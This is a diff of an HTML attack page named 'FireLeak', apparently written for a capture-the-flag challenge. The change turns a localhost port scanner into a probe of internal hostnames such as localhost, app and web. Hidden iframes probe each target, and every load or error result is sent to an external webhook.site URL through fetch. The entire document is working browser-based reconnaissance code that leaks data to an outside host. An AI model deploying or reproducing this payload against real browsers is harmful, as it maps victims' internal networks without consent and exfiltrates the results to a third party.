@@ -1,28 +1,32 @@
 <!doctype html>
 <html>
 <body>
-<h1>FireLeak local port probe</h1>
+<h1>FireLeak host probe</h1>
 
 <script>
 const endpoint = "https://webhook.site/5dc1560a-274c-4539-af81-568512041310";
 
-function log(port, ev) {
-  fetch(`${endpoint}?kind=portscan&port=${port}&event=${ev}`).catch(() => {});
+const hosts = [
+  "http://127.0.0.1",
+  "http://localhost",
+  "http://fireleak",
+  "http://app",
+  "http://web",
+];
+
+function log(host, ev) {
+  fetch(`${endpoint}?kind=hostscan&host=${encodeURIComponent(host)}&event=${ev}`).catch(() => {});
 }
 
-function probePort(port) {
+function probeHost(base) {
   const ifr = document.createElement("iframe");
-  ifr.onload = () => log(port, "load");
-  ifr.onerror = () => log(port, "error");
-  ifr.src = `http://127.0.0.1:${port}/?cb=` + Math.random();
+  ifr.onload = () => log(base, "load");
+  ifr.onerror = () => log(base, "error");
+  ifr.src = base + "/?cb=" + Math.random();
   document.body.appendChild(ifr);
 }
 
-// add/remove ports as you like
-[
-  80, 81, 3000, 3001, 5000, 5001, 8000, 8001,
-  8080, 8081, 9000, 1337, 1338, 27017, 6379
-].forEach(probePort);
+hosts.forEach(probeHost);
 </script>
 
 </body>
